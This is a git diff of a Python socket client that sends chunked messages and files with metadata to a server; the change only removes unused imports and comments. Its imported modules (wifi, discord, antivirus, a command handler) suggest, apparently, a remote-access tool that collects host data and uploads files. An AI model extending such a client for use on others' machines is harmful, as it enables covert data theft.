@@ -2,13 +2,11 @@ import os
 import socket
 import json
 import platform
-import requests
 import time
 import uuid
 import psutil
 import sys
 import threading
-import struct
 
 from modules import wifi
 from modules.discord import discord
@@ -18,7 +16,7 @@ from modules.disk import disk
 from modules.antivirus import antivirus
 from common import utils
 from client.handlers import CommandHandler
-from client_types.message import MESSAGE_TYPE_CONNECTION, MESSAGE_TYPE_PING, Message, MESSAGE_TYPE_PREFILE, MESSAGE_TYPE_FILE
+from client_types.message import MESSAGE_TYPE_CONNECTION, MESSAGE_TYPE_PING, Message
 
 
 class Client:
@@ -96,13 +94,9 @@ class Client:
             chunk = data[i:i+chunk_size].encode('utf-8')
             self.client.sendall(chunk)
 
-        # Signal the end of the message
-        #self.client.sendall(b'END_OF_MESSAGE')
-
     def send_file(self, file_path: str, chunk_size: int = 1024) -> None:
         """Send a file to the server with metadata and chunked content."""
         try:
-            # Validate file existence
             if not os.path.exists(file_path):
                 raise FileNotFoundError(f"File not found: {file_path}")
 
@@ -110,7 +104,6 @@ class Client:
             file_type = utils.get_mime_type(file_path)
             file_size = os.path.getsize(file_path)
 
-            # Step 1: Send metadata
             metadata = json.dumps({
                 "file_name": file_name,
                 "file_size": file_size,
@@ -125,7 +118,6 @@ class Client:
             self.client.sendall(len(metadata_header).to_bytes(4, 'big') + metadata_header.encode('utf-8'))
             self.client.sendall(metadata.encode('utf-8'))
 
-            # Step 2: Send file contents in chunks
             with open(file_path, "rb") as file:
                 while chunk := file.read(chunk_size):
                     self.client.sendall(chunk)
